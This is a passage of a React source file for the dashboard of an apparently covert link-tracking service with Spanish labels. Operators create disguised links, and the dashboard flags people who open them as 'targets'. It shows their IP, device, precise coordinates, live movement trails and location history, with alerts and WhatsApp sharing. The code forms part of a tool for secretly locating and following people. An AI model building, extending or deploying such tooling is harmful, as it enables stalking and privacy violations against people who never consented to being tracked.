import React, { useEffect, useState, useRef } from 'react';
import { MapContainer, Marker, Popup, Polyline, useMap } from 'react-leaflet';
import L from 'leaflet';
import MapLayers from '../components/MapLayers';
import { getBearing, createArrowIcon, createPulseIcon, createDotIcon, createHistoryIcon } from '../utils/mapUtils';
import { io } from 'socket.io-client';
import api from '../services/api';
import { Link, useNavigate, useLocation } from 'react-router-dom';
import { useAuth } from '../contexts/AuthContext';
import Sidebar from '../components/Sidebar';
import CreateLinkForm from '../components/CreateLinkForm';
import UserProfile from '../components/UserProfile';

const mapContainerStyle = {
    width: '100%',
    height: '100%'
};

const center = {
    lat: -34.603722,
    lng: -58.381592
};

const redIcon = L.divIcon({
    className: 'custom-marker',
    html: '<div style="background:#ef4444;width:14px;height:14px;border-radius:50%;border:2px solid white;box-shadow:0 2px 4px rgba(0,0,0,0.3);"></div>',
    iconSize: [16, 16],
    iconAnchor: [8, 8]
});
const blueIcon = L.divIcon({
    className: 'custom-marker',
    html: '<div style="background:#3b82f6;width:14px;height:14px;border-radius:50%;border:2px solid white;box-shadow:0 2px 4px rgba(0,0,0,0.3);"></div>',
    iconSize: [16, 16],
    iconAnchor: [8, 8]
});

const MapController = ({ center, zoom }) => {
    const map = useMap();
    useEffect(() => {
        map.setView(center, zoom);
    }, [map, center, zoom]);
    return null;
};

const HistoryMapController = ({ data, selectedPoint }) => {
    const map = useMap();
    useEffect(() => {
        if (data.length > 1) {
            const bounds = L.latLngBounds(data.map(p => [p.lat, p.lng]));
            map.fitBounds(bounds);
        } else if (data.length === 1) {
            map.setView([data[0].lat, data[0].lng], 15);
        }
    }, [data, map]);

    useEffect(() => {
        if (selectedPoint) {
            map.setView([selectedPoint.lat, selectedPoint.lng], 17);
        }
    }, [selectedPoint, map]);

    return null;
};

const HistoryMapRefSetter = ({ mapRef }) => {
    const map = useMap();
    useEffect(() => {
        mapRef.current = map;
    }, [map, mapRef]);
    return null;
};

// Haversine distance in meters
const haversineDistance = (lat1, lng1, lat2, lng2) => {
    const R = 6371000;
    const dLat = (lat2 - lat1) * Math.PI / 180;
    const dLng = (lng2 - lng1) * Math.PI / 180;
    const a = Math.sin(dLat / 2) ** 2 + Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.sin(dLng / 2) ** 2;
    return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
};

const formatDistance = (meters) => {
    if (meters < 1000) return `${Math.round(meters)} m`;
    return `${(meters / 1000).toFixed(2)} km`;
};

const formatDuration = (ms) => {
    const secs = Math.floor(ms / 1000);
    if (secs < 60) return `${secs}s`;
    const mins = Math.floor(secs / 60);
    if (mins < 60) return `${mins}m ${secs % 60}s`;
    const hrs = Math.floor(mins / 60);
    return `${hrs}h ${mins % 60}m`;
};

const UserDashboard = () => {
    const { logout } = useAuth();
    const navigate = useNavigate();
    const [sidebarCollapsed, setSidebarCollapsed] = useState(false);

    const [stats, setStats] = useState({ totalLinks: 0, totalLocations: 0 });
    const [myLocation, setMyLocation] = useState(null);
    const [links, setLinks] = useState([]);
    const [sessions, setSessions] = useState([]);
    const [activeTab, setActiveTab] = useState('overview'); // overview, map, links
    const [selectedSession, setSelectedSession] = useState(null);
    const [editingLink, setEditingLink] = useState(null);
    const [toast, setToast] = useState(null);
    const [deleteId, setDeleteId] = useState(null);
    const [cleanId, setCleanId] = useState(null);
    const [clearAllMap, setClearAllMap] = useState(false);
    const [showUserMenu, setShowUserMenu] = useState(false);
    const [userProfile, setUserProfile] = useState(null);
    const socketRef = useRef();
    const lastSessionIdRef = useRef(null);
    const lastAlertRef = useRef(null);
    const [pausedLinks, setPausedLinks] = useState(new Set());
    const pausedLinksRef = useRef(new Set());
    const [historyModal, setHistoryModal] = useState(null); // { linkId, linkTitle }
    const [historyData, setHistoryData] = useState([]);
    const [historyDates, setHistoryDates] = useState([]);
    const [historyDateFrom, setHistoryDateFrom] = useState('');
    const [historyDateTo, setHistoryDateTo] = useState('');
    const [historyLoading, setHistoryLoading] = useState(false);
    const [selectedHistoryPoint, setSelectedHistoryPoint] = useState(null);
    const historyMapRef = useRef(null);
    const [liveTrails, setLiveTrails] = useState({});
    const sessionsRef = useRef([]);

    useEffect(() => { sessionsRef.current = sessions; }, [sessions]);

    const togglePause = async (id) => {
        try {
            const res = await api.put(`/links/${id}/tracking`);
            const isNowActive = res.data.trackingActive;
            setPausedLinks(prev => {
                const next = new Set(prev);
                if (isNowActive) {
                    next.delete(id);
                } else {
                    next.add(id);
                }
                pausedLinksRef.current = next;
                return next;
            });
        } catch (e) {
            console.error('Error toggling tracking:', e);
        }
    };

    // Load initial tracking states from server
    const loadTrackingStates = async (linksList) => {
        const paused = new Set();
        for (const link of linksList) {
            if (link.trackingActive === false) {
                paused.add(link.id);
            }
        }
        setPausedLinks(paused);
        pausedLinksRef.current = paused;
    };

    const playNotificationSound = () => {
        try {
            const audio = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3'); // Clearer "Ping" sound
            audio.volume = 0.8;
            audio.play().catch(e => console.log('Audio requires interaction:', e));
        } catch (e) {
            console.error('Sound error', e);
        }
    };

    useEffect(() => {
        fetchData();

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    setMyLocation({
                        lat: position.coords.latitude,
                        lng: position.coords.longitude
                    });
                },
                (error) => {
                    console.error("Error obtaining location", error);
                }
            );
        }

        // POLLING FALLBACK: Vercel Serverless does not support persistent WebSockets well.
        // We use polling every 4 seconds to ensure data appears "live".
        const intervalId = setInterval(() => {
            fetchSessions();
        }, 4000);

        // Socket logic kept for local dev, but polling ensures production works
        const socket = io('/', { path: '/socket.io' });
        socketRef.current = socket;

        socket.on('connect', () => {
            socket.emit('join-admin');
        });

        socket.on('location-updated', (session) => {
            // Check if this link is paused (muted)
            if (pausedLinksRef.current.has(session.linkId)) {
                return;
            }

            // Build live trail for real-time route tracking
            const key = session.socketId || session.id;
            setLiveTrails(prev => {
                const trail = prev[key] || [];
                const last = trail[trail.length - 1];
                if (last && last.lat === session.lat && last.lng === session.lng) {
                    return prev;
                }
                const prevSession = sessionsRef.current.find(s => (s.socketId || s.id) === key);
                let newTrail = [...trail];
                if (prevSession && (!last || last.lat !== prevSession.lat || last.lng !== prevSession.lng)) {
                    newTrail.push({ lat: prevSession.lat, lng: prevSession.lng, timestamp: prevSession.timestamp });
                }
                newTrail.push({ lat: session.lat, lng: session.lng, timestamp: session.timestamp });
                if (newTrail.length > 200) newTrail = newTrail.slice(-200);
                return { ...prev, [key]: newTrail };
            });

            // Suppress repeated alarms for the same IP within 60 seconds
            const now = Date.now();
            if (
                lastAlertRef.current &&
                lastAlertRef.current.ip === session.ip &&
                (now - lastAlertRef.current.time < 60000)
            ) {
                // Just update data, no sound/toast
                fetchSessions();
                return;
            }

            // New Alert
            lastAlertRef.current = { ip: session.ip, time: now };

            fetchSessions();
            setToast(session);
            playNotificationSound();
            setTimeout(() => setToast(null), 10000);
        });

        socket.on('client-disconnected', (socketId) => {
            setLiveTrails(prev => {
                const updated = { ...prev };
                delete updated[socketId];
                return updated;
            });
        });

        return () => {
            socket.disconnect();
            clearInterval(intervalId); // Clear polling on unmount
        };
    }, []);

    const fetchData = async () => {
        try {
            const [statsRes, linksRes, sessionsRes, profileRes] = await Promise.all([
                api.get('/user/stats'),
                api.get('/user/links'),
                api.get('/user/sessions'),
                api.get('/user/profile')
            ]);
            setStats(statsRes.data);
            setLinks(linksRes.data);
            setSessions(sessionsRes.data);
            setUserProfile(profileRes.data);

            // Load tracking active/paused states from links
            loadTrackingStates(linksRes.data);

            // Init ref to avoid initial beep
            if (sessionsRes.data.length > 0) {
                lastSessionIdRef.current = sessionsRes.data[0].id;
            }
        } catch (error) {
            console.error("Error fetching dashboard data", error);
        }
    };

    const fetchSessions = async () => {
        try {
            const res = await api.get('/user/sessions');
            const newSessions = res.data;

            // Check for new detected session (Polling fallback)
            if (newSessions.length > 0) {
                const latest = newSessions[0];
                // If we have previous data AND the latest ID is different from stored
                if (lastSessionIdRef.current && latest.id !== lastSessionIdRef.current) {
                    // Only alert if NOT paused
                    if (!pausedLinksRef.current.has(latest.linkId)) {
                        setToast(latest);
                        playNotificationSound();
                    }
                }
                lastSessionIdRef.current = latest.id;
            }

            setSessions(newSessions);
            const statsRes = await api.get('/user/stats');
            setStats(statsRes.data);
        } catch (e) { console.error(e); }
    };

    const handleLocate = (session) => {
        setSelectedSession(session);
        setActiveTab('map');
    };

    const handleDeleteLink = (id) => {
        setDeleteId(id);
    };

    const confirmDelete = async () => {
        if (!deleteId) return;
        try {
            await api.delete(`/links/${deleteId}`);
            setDeleteId(null);
            fetchData();
        } catch (e) {
            alert('Error eliminando enlace: ' + (e.response?.data?.message || e.message));
        }
    };

    const handleClearMap = () => {
        setClearAllMap(true);
    };

    const confirmClearAllMap = async () => {
        try {
            await api.delete('/user/sessions');
            setSessions([]);
            setLiveTrails({});
            fetchSessions();
            setClearAllMap(false);
        } catch (e) {
            alert('Error limpiando mapa: ' + e.message);
        }
    };

    const handleClearLinkHistory = (linkId) => {
        setCleanId(linkId);
    };

    const confirmClean = async () => {
        if (!cleanId) return;
        try {
            await api.delete(`/links/${cleanId}/sessions`);
            setCleanId(null);
            fetchSessions();
        } catch (e) {
            alert('Error: ' + e.message);
        }
    };

    const handleUpdateLink = async (e) => {
        e.preventDefault();
        try {
            await api.put(`/links/${editingLink.id}`, editingLink);
            setEditingLink(null);
            fetchData();
        } catch (e) {
            alert('Error actualizando enlace: ' + (e.response?.data?.message || e.message));
        }
    };

    const openHistory = async (linkId, linkTitle) => {
        setHistoryModal({ linkId, linkTitle });
        setHistoryData([]);
        setHistoryDates([]);
        setHistoryDateFrom('');
        setHistoryDateTo('');
        try {
            const datesRes = await api.get(`/links/${linkId}/history/dates`);
            setHistoryDates(datesRes.data);
            // Auto-load today's data if available
            const today = new Date().toISOString().split('T')[0];
            const hasToday = datesRes.data.some(d => d.date === today);
            if (hasToday) {
                setHistoryDateFrom(today);
                setHistoryDateTo(today);
                fetchHistory(linkId, today, today);
            } else if (datesRes.data.length > 0) {
                const latestDate = datesRes.data[0].date;
                setHistoryDateFrom(latestDate);
                setHistoryDateTo(latestDate);
                fetchHistory(linkId, latestDate, latestDate);
            }
        } catch (e) {
            console.error('Error loading history dates:', e);
        }
    };

    const fetchHistory = async (linkId, from, to) => {
        setHistoryLoading(true);
        try {
            const params = {};
            if (from) {
                const fromDate = new Date(from);
                fromDate.setUTCHours(0, 0, 0, 0);
                params.from = fromDate.toISOString();
            }
            if (to) {
                const toDate = new Date(to);
                toDate.setUTCHours(23, 59, 59, 999);
                params.to = toDate.toISOString();
            }
            const res = await api.get(`/links/${linkId}/history`, { params });
            setHistoryData(res.data);
        } catch (e) {
            console.error('Error fetching history:', e);
        }
        setHistoryLoading(false);
    };

    const handleHistoryFilter = () => {
        if (historyModal) {
            fetchHistory(historyModal.linkId, historyDateFrom, historyDateTo);
        }
    };

    const parseUA = (ua) => {
        if (!ua) return { os: '?', browser: '?' };
        let os = 'Unknown';
        if (ua.includes('Windows')) os = 'Windows';
        else if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('iPhone')) os = 'iOS';
        else if (ua.includes('Macintosh')) os = 'Mac';
        else if (ua.includes('Linux')) os = 'Linux';

        let browser = 'Browser';
        if (ua.includes('Chrome')) browser = 'Chrome';
        else if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
        else if (ua.includes('Edge')) browser = 'Edge';

        return { os, browser };
    };



    return (
        <div className="bg-background-light dark:bg-background-dark min-h-screen flex font-display">
            {/* Desktop Sidebar */}
            <div className="hidden md:block">
                <Sidebar activeTab={activeTab} onTabChange={setActiveTab} onCollapseChange={setSidebarCollapsed} />
            </div>

            <main className={`flex-1 p-4 md:p-8 pb-24 md:pb-8 overflow-y-auto w-full transition-all duration-300 ${sidebarCollapsed ? 'md:ml-16' : 'md:ml-64'}`}>
                <header className="flex justify-between items-center mb-8">
                    <div>
                        <h2 className="text-2xl font-bold text-slate-900 dark:text-white">
                            {activeTab === 'overview' && 'Resumen del Panel'}
                            {activeTab === 'map' && 'Monitoreo en Tiempo Real'}
                            {activeTab === 'links' && 'Gestión de Enlaces'}
                            {activeTab === 'create' && 'Nuevo Enlace de Rastreo'}
                            {activeTab === 'profile' && 'Mi Perfil'}
                        </h2>
                        <p className="text-slate-500 dark:text-text-muted text-sm">Bienvenido, {userProfile?.email?.split('@')[0] || 'Usuario'}</p>
                    </div>
                    <div className="h-10 w-10 relative">
                        <div
                            onClick={() => setShowUserMenu(!showUserMenu)}
                            className={`h-10 w-10 rounded-full flex items-center justify-center font-bold cursor-pointer transition-all border border-slate-300 dark:border-slate-600 ${userProfile?.avatarUrl ? 'bg-cover bg-center' : 'bg-slate-200 dark:bg-slate-700 text-slate-500 dark:text-slate-400 hover:bg-slate-300 dark:hover:bg-slate-600'}`}
                            style={userProfile?.avatarUrl ? { backgroundImage: `url(${userProfile.avatarUrl})` } : {}}
                        >
                            {!userProfile?.avatarUrl && 'U'}
                        </div>

                        {/* User Dropdown Menu */}
                        {showUserMenu && (
                            <div className="absolute top-12 right-0 bg-white dark:bg-slate-800 rounded-xl shadow-xl border border-slate-100 dark:border-slate-700 w-48 overflow-hidden z-50 animate-in fade-in slide-in-from-top-2 duration-200">
                                <div className="p-3 border-b border-slate-100 dark:border-slate-700 bg-slate-50 dark:bg-slate-800/50">
                                    <p className="text-xs font-bold text-slate-900 dark:text-white">Usuario</p>
                                    <p className="text-[10px] text-slate-500 truncate">user@example.com</p>
                                </div>
                                <div className="p-1">
                                    <button
                                        onClick={() => { setActiveTab('profile'); setShowUserMenu(false); }}
                                        className="w-full flex items-center gap-2 px-3 py-2 text-sm text-slate-600 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-700 rounded-lg transition-colors text-left"
                                    >
                                        <span className="material-symbols-outlined text-lg">person</span>
                                        Mi Perfil
                                    </button>
                                    <button
                                        onClick={() => { logout(); navigate('/login'); }}
                                        className="w-full flex items-center gap-2 px-3 py-2 text-sm text-red-500 hover:bg-red-50 dark:hover:bg-red-900/20 rounded-lg transition-colors text-left"
                                    >
                                        <span className="material-symbols-outlined text-lg">logout</span>
                                        Cerrar Sesión
                                    </button>
                                </div>
                            </div>
                        )}
                    </div>
                </header>

                {toast && (
                    <div className="fixed top-8 right-8 z-[101] animate-in slide-in-from-right-8 duration-300">
                        <div className="bg-slate-900 dark:bg-primary border border-white/20 rounded-2xl shadow-2xl p-4 flex items-center gap-4 text-white max-w-sm">
                            <div className="size-12 rounded-xl bg-white/10 flex items-center justify-center">
                                <span className="material-symbols-outlined text-primary dark:text-white animate-pulse">radar</span>
                            </div>
                            <div className="flex-1">
                                <p className="text-sm font-bold">¡Objetivo Detectado!</p>
                                <p className="text-[10px] text-white/70 italic truncate">Nueva ubicación recibida</p>
                            </div>
                            <button
                                onClick={() => { handleLocate(toast); setToast(null); }}
                                className="px-4 py-2 rounded-lg bg-white text-slate-900 font-bold text-xs hover:bg-slate-100 transition-colors"
                            >
                                ABRIR MAPA
                            </button>
                            <button onClick={() => setToast(null)} className="p-1 hover:bg-white/10 rounded-full transition-colors">
                                <span className="material-symbols-outlined text-sm">close</span>
                            </button>
                        </div>
                    </div>
                )}

                {activeTab === 'create' && (
                    <div className="animate-in fade-in zoom-in-95 duration-300">

                        <CreateLinkForm onLinkCreated={() => { fetchData(); setActiveTab('links'); }} />
                    </div>
                )}

                {activeTab === 'profile' && (
                    <div className="animate-in fade-in zoom-in-95 duration-300">
                        <UserProfile onProfileUpdate={fetchData} />
                    </div>
                )}

                {activeTab === 'overview' && (
                    <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                        <div className="lg:col-span-2 flex flex-col gap-6">
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                <div className="bg-white dark:bg-surface-dark p-6 rounded-xl border border-slate-100 dark:border-border-dark shadow-sm">
                                    <h3 className="text-slate-500 dark:text-text-muted text-sm font-medium">Total Enlaces</h3>
                                    <p className="text-3xl font-bold text-slate-900 dark:text-white mt-1">{stats.totalLinks}</p>
                                </div>
                                <div className="bg-white dark:bg-surface-dark p-6 rounded-xl border border-slate-100 dark:border-border-dark shadow-sm">
                                    <h3 className="text-slate-500 dark:text-text-muted text-sm font-medium">Ubicaciones</h3>
                                    <p className="text-3xl font-bold text-slate-900 dark:text-white mt-1">{stats.totalLocations}</p>
                                </div>
                            </div>
                            <div className="bg-white dark:bg-surface-dark rounded-xl border border-slate-100 dark:border-border-dark shadow-sm p-6 h-[400px] relative overflow-hidden">
                                <MapContainer style={mapContainerStyle} zoom={2} center={[center.lat, center.lng]}>
                                    <MapLayers googleApiKey={import.meta.env.VITE_GOOGLE_MAPS_API_KEY} />
                                    {sessions.map(s => {
                                        const key = s.socketId || s.id;
                                        const trail = liveTrails[key] || [];
                                        let bearing = 0;
                                        let isMoving = false;
                                        if (trail.length >= 2) {
                                            const last = trail[trail.length - 1];
                                            const prev = trail[trail.length - 2];
                                            bearing = getBearing(prev.lat, prev.lng, last.lat, last.lng);
                                            isMoving = true;
                                        }
                                        return (
                                            <Marker key={key} position={[s.lat, s.lng]} icon={createPulseIcon(bearing, isMoving)} />
                                        );
                                    })}
                                </MapContainer>
                            </div>
                        </div>
                        <div className="bg-white dark:bg-surface-dark p-6 rounded-xl border border-slate-100 dark:border-border-dark shadow-sm overflow-hidden flex flex-col h-[520px]">
                            <h3 className="text-slate-900 dark:text-white font-bold mb-4">Actividad Reciente</h3>
                            <div className="flex-1 overflow-auto flex flex-col gap-3 pr-2 custom-scrollbar">
                                {sessions.map((s, i) => {
                                    const { os, browser } = parseUA(s.userAgent);
                                    return (
                                        <div key={i} onClick={() => handleLocate(s)} className="p-4 rounded-xl bg-slate-50 dark:bg-slate-800/40 border border-slate-100 dark:border-slate-800 group hover:border-primary/40 transition-all cursor-pointer">
                                            <div className="flex justify-between items-start mb-2">
                                                <div className="flex items-center gap-2">
                                                    <span className="material-symbols-outlined text-primary text-lg">person_pin_circle</span>
                                                    <span className="text-xs font-bold dark:text-white">Hit Detectado</span>
                                                </div>
                                                <span className="text-[10px] text-slate-400 font-mono">{new Date(s.timestamp).toLocaleTimeString()}</span>
                                            </div>
                                            <div className="grid grid-cols-2 gap-2 text-[11px] text-slate-600 dark:text-slate-300">
                                                <div className="bg-white dark:bg-slate-900 p-1.5 rounded-lg border border-slate-100 dark:border-slate-800 flex items-center gap-1">
                                                    <span className="material-symbols-outlined text-[14px]">devices</span> {os}
                                                </div>
                                                <div className="bg-white dark:bg-slate-900 p-1.5 rounded-lg border border-slate-100 dark:border-slate-800 flex items-center gap-1">
                                                    <span className="material-symbols-outlined text-[14px]">language</span> {browser}
                                                </div>
                                            </div>
                                            <p className="mt-2 text-[10px] text-slate-400 font-mono truncate">IP: {s.ip}</p>
                                        </div>
                                    );
                                })}
                                {sessions.length === 0 && <p className="text-center text-slate-500 text-sm py-8 italic">Esperando actividad...</p>}
                            </div>
                        </div>
                    </div>
                )}

                {activeTab === 'map' && (
                    <div className="bg-white dark:bg-surface-dark rounded-xl border border-slate-100 dark:border-border-dark shadow-sm overflow-hidden h-[600px] relative">
                            <MapContainer style={mapContainerStyle} zoom={selectedSession ? 15 : (myLocation ? 12 : 2)} center={selectedSession ? [selectedSession.lat, selectedSession.lng] : (myLocation ? [myLocation.lat, myLocation.lng] : [center.lat, center.lng])}>
                                <MapLayers googleApiKey={import.meta.env.VITE_GOOGLE_MAPS_API_KEY} />
                                {/* Admin/User Device Location */}
                                {myLocation && (
                                    <Marker
                                        position={[myLocation.lat, myLocation.lng]}
                                        icon={createDotIcon('#3b82f6')}
                                        title="Tu Ubicación"
                                    />
                                )}

                                {/* Live Trails with animated polylines and direction arrows */}
                                {Object.entries(liveTrails).map(([key, trail]) => {
                                    if (trail.length < 2) return null;
                                    return (
                                        <React.Fragment key={`trail-${key}`}>
                                            <Polyline
                                                positions={trail.map(p => [p.lat, p.lng])}
                                                pathOptions={{ color: '#ef4444', weight: 3, opacity: 0.85, className: 'animated-trail' }}
                                            />
                                            {trail.map((point, idx) => {
                                                if (idx === 0) return null;
                                                const prev = trail[idx - 1];
                                                const bearing = getBearing(prev.lat, prev.lng, point.lat, point.lng);
                                                const midLat = (prev.lat + point.lat) / 2;
                                                const midLng = (prev.lng + point.lng) / 2;
                                                return (
                                                    <Marker
                                                        key={`arrow-${key}-${idx}`}
                                                        position={[midLat, midLng]}
                                                        icon={createArrowIcon(bearing, '#ef4444')}
                                                        interactive={false}
                                                    />
                                                );
                                            })}
                                        </React.Fragment>
                                    );
                                })}

                                {/* Target Sessions with directional pulse markers */}
                                {sessions.map(s => {
                                    const key = s.socketId || s.id;
                                    const trail = liveTrails[key] || [];
                                    let bearing = 0;
                                    let isMoving = false;
                                    if (trail.length >= 2) {
                                        const last = trail[trail.length - 1];
                                        const prev = trail[trail.length - 2];
                                        bearing = getBearing(prev.lat, prev.lng, last.lat, last.lng);
                                        isMoving = true;
                                    }
                                    return (
                                        <Marker
                                            key={key}
                                            position={[s.lat, s.lng]}
                                            icon={createPulseIcon(bearing, isMoving)}
                                            title={`IP: ${s.ip} - ${s.userAgent}`}
                                            eventHandlers={{ click: () => setSelectedSession(s) }}
                                        >
                                            {selectedSession?.id === s.id && (
                                                <Popup eventHandlers={{ popupclose: () => setSelectedSession(null) }}>
                                                    <div className="p-2 min-w-[200px]">
                                                        <p className="font-bold text-slate-800 text-sm mb-1">Objetivo Detectado</p>
                                                        <div className="flex gap-2 mb-2 text-[10px] font-mono bg-slate-100 rounded px-1.5 py-1 text-slate-600">
                                                            <span>Lat: {selectedSession.lat.toFixed(6)}</span>
                                                            <span>Lng: {selectedSession.lng.toFixed(6)}</span>
                                                        </div>
                                                        <p className="text-xs text-slate-600 mb-2">IP: {selectedSession.ip}</p>
                                                        <p className="text-xs text-slate-500 italic mb-3">{new Date(selectedSession.timestamp).toLocaleString()}</p>
                                                        <button
                                                            onClick={() => {
                                                                const mapLink = `https://www.google.com/maps/search/?api=1&query=${selectedSession.lat},${selectedSession.lng}`;
                                                                const text = `Ubicación detectada: ${mapLink}`;
                                                                window.open(`https://wa.me/?text=${encodeURIComponent(text)}`, '_blank');
                                                            }}
                                                            className="w-full flex items-center justify-center gap-2 bg-[#25D366] text-white py-2 rounded-lg text-xs font-bold hover:bg-[#20bd5a] transition-colors"
                                                        >
                                                            Compartir Ubicación
                                                        </button>
                                                    </div>
                                                </Popup>
                                            )}
                                        </Marker>
                                    );
                                })}
                            </MapContainer>
                        <div className="absolute top-4 right-4 bg-slate-900/85 backdrop-blur-md p-4 rounded-xl border border-white/10 text-white flex flex-col gap-3 shadow-2xl z-[10] min-w-[140px]">
                            <div className="flex items-center gap-2">
                                <span className="relative flex h-2.5 w-2.5">
                                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                                    <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-green-500"></span>
                                </span>
                                <p className="text-[10px] font-bold uppercase tracking-wider text-slate-300">En Vivo</p>
                            </div>
                            <p className="text-3xl font-bold leading-none">{sessions.length} <span className="text-sm font-normal text-slate-400">Objetivos</span></p>
                            {sessions.length > 0 && (
                                <button
                                    onClick={handleClearMap}
                                    className="w-full py-2 bg-red-500 hover:bg-red-600 text-white text-xs font-bold rounded-lg transition-all flex items-center justify-center gap-2 shadow-lg shadow-red-500/20"
                                >
                                    <span className="material-symbols-outlined text-sm">delete</span> Limpiar Mapa
                                </button>
                            )}
                        </div>
                    </div>
                )}

                {activeTab === 'links' && (
                    <div className="bg-white dark:bg-surface-dark rounded-xl border border-slate-100 dark:border-border-dark shadow-sm overflow-hidden">
                        {/* Desktop Table View */}
                        <div className="hidden md:block overflow-x-auto">
                            <table className="w-full text-left">
                                <thead className="bg-slate-50 dark:bg-black/20 border-b border-slate-100 dark:border-border-dark">
                                    <tr>
                                        <th className="px-6 py-4 text-xs font-semibold text-slate-500 dark:text-text-muted uppercase">Título / Enlace</th>
                                        <th className="px-6 py-4 text-xs font-semibold text-slate-500 dark:text-text-muted uppercase">Creado</th>
                                        <th className="px-6 py-4 text-xs font-semibold text-slate-500 dark:text-text-muted uppercase text-right">Acción</th>
                                    </tr>
                                </thead>
                                <tbody className="divide-y divide-slate-100 dark:divide-border-dark">
                                    {links.map(link => (
                                        <tr key={link.id} className="hover:bg-slate-50 dark:hover:bg-slate-800/50 transition-colors">
                                            <td className="px-6 py-4">
                                                <div className="flex items-center gap-3">
                                                    <div className="w-10 h-10 rounded bg-slate-100 dark:bg-slate-800 bg-cover bg-center border border-white/10" style={{ backgroundImage: `url(${link.imageUrl})` }}></div>
                                                    <div className="flex flex-col">
                                                        <span className="text-sm font-bold dark:text-white">{link.title}</span>
                                                        <span className="text-[10px] font-mono text-primary truncate max-w-[200px]">{link.destinationUrl}</span>
                                                    </div>
                                                </div>
                                            </td>
                                            <td className="px-6 py-4 text-sm text-slate-500">{new Date(link.createdAt).toLocaleDateString()}</td>
                                            <td className="px-6 py-4 text-right">
                                                <div className="flex justify-end gap-1">
                                                    <button
                                                        onClick={() => togglePause(link.id)}
                                                        className={`p-2 rounded-lg transition-colors ${pausedLinks.has(link.id) ? 'text-green-500 hover:bg-green-50' : 'text-orange-500 hover:bg-orange-50'}`}
                                                        title={pausedLinks.has(link.id) ? "Reanudar Rastreo" : "Pausar Rastreo"}
                                                    >
                                                        <span className="material-symbols-outlined text-[20px]">
                                                            {pausedLinks.has(link.id) ? 'play_arrow' : 'pause'}
                                                        </span>
                                                    </button>
                                                    <button onClick={() => setActiveTab('map')} className="p-2 text-blue-400 hover:bg-blue-50 dark:hover:bg-blue-900/10 rounded-lg transition-colors" title="Ver en Mapa">
                                                        <span className="material-symbols-outlined text-[20px]">map</span>
                                                    </button>
                                                    <button onClick={() => navigator.clipboard.writeText(`${window.location.origin}/s/${link.id}`)} className="p-2 text-primary hover:bg-primary/10 rounded-lg transition-colors" title="Copiar Enlace"><span className="material-symbols-outlined text-[20px]">content_copy</span></button>
                                                    <button onClick={() => openHistory(link.id, link.title)} className="p-2 text-purple-500 hover:bg-purple-50 dark:hover:bg-purple-900/10 rounded-lg transition-colors" title="Ver Historial"><span className="material-symbols-outlined text-[20px]">history</span></button>
                                                    <button onClick={() => handleClearLinkHistory(link.id)} className="p-2 text-amber-500 hover:bg-amber-50 dark:hover:bg-amber-900/10 rounded-lg transition-colors" title="Limpiar Historial"><span className="material-symbols-outlined text-[20px]">cleaning_services</span></button>
                                                    <button onClick={() => setEditingLink({ ...link })} className="p-2 text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-800 rounded-lg transition-colors"><span className="material-symbols-outlined text-[20px]">edit</span></button>
                                                    <button onClick={() => handleDeleteLink(link.id)} className="p-2 text-red-400 hover:bg-red-50 dark:hover:bg-red-900/10 rounded-lg transition-colors"><span className="material-symbols-outlined text-[20px]">delete</span></button>
                                                </div>
                                            </td>
                                        </tr>
                                    ))}
                                </tbody>
                            </table>
                        </div>

                        {/* Mobile Card List View */}
                        <div className="md:hidden p-4 space-y-4">
                            {links.map(link => (
                                <div key={link.id} className="bg-slate-50 dark:bg-slate-800/50 rounded-xl p-4 border border-slate-100 dark:border-slate-800 shadow-sm">
                                    <div className="flex gap-4 mb-3">
                                        <div className="w-14 h-14 rounded-lg bg-slate-200 dark:bg-slate-700 bg-cover bg-center shadow-inner" style={{ backgroundImage: `url(${link.imageUrl})` }}></div>
                                        <div className="flex-1 min-w-0">
                                            <h4 className="font-bold text-slate-900 dark:text-white truncate">{link.title}</h4>
                                            <p className="text-xs text-primary font-mono truncate mb-1">{link.destinationUrl}</p>
                                            <p className="text-[10px] text-slate-400">{new Date(link.createdAt).toLocaleDateString()}</p>
                                        </div>
                                    </div>
                                    <div className="flex items-center justify-between gap-1 pt-3 border-t border-slate-200 dark:border-slate-700">
                                        <button
                                            onClick={() => togglePause(link.id)}
                                            className={`flex flex-col items-center gap-1 p-2 rounded-lg flex-1 ${pausedLinks.has(link.id) ? 'text-green-500 hover:bg-green-50 dark:hover:bg-green-900/20' : 'text-orange-500 hover:bg-orange-50 dark:hover:bg-orange-900/20'}`}
                                        >
                                            <span className="material-symbols-outlined text-[20px]">{pausedLinks.has(link.id) ? 'play_arrow' : 'pause'}</span>
                                            <span className="text-[9px] font-bold">{pausedLinks.has(link.id) ? 'Reanudar' : 'Pausar'}</span>
                                        </button>
                                        <button onClick={() => setActiveTab('map')} className="flex flex-col items-center gap-1 p-2 text-blue-500 hover:bg-blue-50 dark:hover:bg-blue-900/20 rounded-lg flex-1">
                                            <span className="material-symbols-outlined text-[20px]">map</span>
                                            <span className="text-[9px] font-bold">Mapa</span>
                                        </button>
                                        <button onClick={() => navigator.clipboard.writeText(`${window.location.origin}/s/${link.id}`)} className="flex flex-col items-center gap-1 p-2 text-primary hover:bg-primary/10 rounded-lg flex-1">
                                            <span className="material-symbols-outlined text-[20px]">content_copy</span>
                                            <span className="text-[9px] font-bold">Copiar</span>
                                        </button>
                                        <button onClick={() => openHistory(link.id, link.title)} className="flex flex-col items-center gap-1 p-2 text-purple-500 hover:bg-purple-50 dark:hover:bg-purple-900/20 rounded-lg flex-1">
                                            <span className="material-symbols-outlined text-[20px]">history</span>
                                            <span className="text-[9px] font-bold">Historial</span>
                                        </button>
                                        <button onClick={() => setEditingLink({ ...link })} className="flex flex-col items-center gap-1 p-2 text-slate-500 hover:bg-slate-100 dark:hover:bg-slate-700 rounded-lg flex-1">
                                            <span className="material-symbols-outlined text-[20px]">edit</span>
                                            <span className="text-[9px] font-bold">Editar</span>
